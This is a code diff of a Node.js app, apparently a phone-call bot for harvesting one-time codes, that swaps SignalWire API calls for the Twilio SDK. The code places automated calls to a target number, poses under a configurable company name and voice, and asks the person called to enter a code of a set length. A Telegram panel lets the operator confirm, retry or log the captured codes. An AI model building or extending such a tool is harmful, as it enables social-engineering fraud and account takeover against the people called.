@@ -1,6 +1,7 @@
 const express=require("express")
 const bodyParser=require("body-parser")
 const fetch=require("node-fetch")
+const twilio=require("twilio")
 
 const app=express()
 app.use(bodyParser.urlencoded({extended:false}))
@@ -11,16 +12,13 @@ const PORT=process.env.PORT||3000
 const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
 const CHAT_ID=process.env.CHAT_ID
 
-const SW_PROJECT=process.env.SW_PROJECT
-const SW_TOKEN=process.env.SW_TOKEN
-const SW_SPACE=process.env.SW_SPACE
-const SW_NUMBER=process.env.SW_NUMBER
+const TWILIO_ACCOUNT_SID=process.env.TWILIO_ACCOUNT_SID
+const TWILIO_AUTH_TOKEN=process.env.TWILIO_AUTH_TOKEN
+const TWILIO_NUMBER=process.env.TWILIO_NUMBER
 
 const BASE_URL=process.env.BASE_URL
 
-function auth(){
-return "Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")
-}
+const client=twilio(TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN)
 
 /* SETTINGS */
 
@@ -241,7 +239,7 @@ res.send(`
 `)
 })
 
-/* TELEGRAM WEBHOOK */
+/* TELEGRAM */
 
 app.post("/telegram",async(req,res)=>{
 
@@ -253,14 +251,8 @@ const action=update.callback_query.data
 
 if(action==="confirm"){
 
-await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
-method:"POST",
-headers:{
-Authorization:auth(),
-"Content-Type":"application/x-www-form-urlencoded"
-},
-body:new URLSearchParams({
-Twiml:`
+await client.calls(activeCallSid).update({
+twiml:`
 <Response>
 <Say voice="${assistants[settings.assistant].voice}">
 Thank you. Your code has been confirmed. Have a great day.
@@ -268,7 +260,6 @@ Thank you. Your code has been confirmed. Have a great day.
 <Hangup/>
 </Response>
 `
-})
 })
 
 callStatus="Ended"
@@ -281,14 +272,8 @@ updatePanel()
 
 if(action==="retry"){
 
-await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
-method:"POST",
-headers:{
-Authorization:auth(),
-"Content-Type":"application/x-www-form-urlencoded"
-},
-body:new URLSearchParams({
-Twiml:`
+await client.calls(activeCallSid).update({
+twiml:`
 <Response>
 <Say voice="${assistants[settings.assistant].voice}">
 Please re-enter your code.
@@ -297,25 +282,16 @@ Please re-enter your code.
 </Response>
 `
 })
-})
 
 activeCode=null
-
 updatePanel()
 
 }
 
 if(action==="hangup"){
 
-await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
-method:"POST",
-headers:{
-Authorization:auth(),
-"Content-Type":"application/x-www-form-urlencoded"
-},
-body:new URLSearchParams({
-Twiml:`<Response><Hangup/></Response>`
-})
+await client.calls(activeCallSid).update({
+twiml:`<Response><Hangup/></Response>`
 })
 
 callStatus="Ended"
@@ -348,6 +324,8 @@ tgSend(text)
 
 }
 
+/* COMMANDS */
+
 if(update.message){
 
 const text=update.message.text
@@ -358,6 +336,7 @@ const d=parseInt(text.split(" ")[1])
 
 if(d>=2 && d<=10){
 settings.digits=d
+tgSend(`✅ ${d} digits set`)
 updatePanel()
 }
 
@@ -369,6 +348,7 @@ const a=parseInt(text.split(" ")[1])
 
 if(a>=1 && a<=assistants.length){
 settings.assistant=a-1
+tgSend(`🤖 ${assistants[a-1].name} assistant set`)
 updatePanel()
 }
 
@@ -378,6 +358,8 @@ if(text.startsWith("/company")){
 
 settings.company=text.replace("/company ","")
 
+tgSend(`🏢 Company set to ${settings.company}`)
+
 updatePanel()
 
 }
@@ -385,6 +367,24 @@ updatePanel()
 if(text==="/panel"){
 panelMessageId=null
 updatePanel()
+}
+
+if(text==="/commands"){
+
+tgSend(`⚙ Commands
+
+/digits X → set digits
+/assistant X → set assistant
+/company NAME → set company
+/panel → open control panel
+/status → refresh panel
+/logs → show last codes
+
+Current:
+${settings.digits} digits set
+Assistant: ${assistants[settings.assistant].name}
+Company: ${settings.company}`)
+
 }
 
 }
@@ -399,17 +399,10 @@ async function startCall(number){
 
 if(!number)return
 
-await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
-method:"POST",
-headers:{
-Authorization:auth(),
-"Content-Type":"application/x-www-form-urlencoded"
-},
-body:new URLSearchParams({
-From:SW_NUMBER,
-To:number,
-Url:`${BASE_URL}/ivr`
-})
+await client.calls.create({
+url:`${BASE_URL}/ivr`,
+to:number,
+from:TWILIO_NUMBER
 })
 
 }
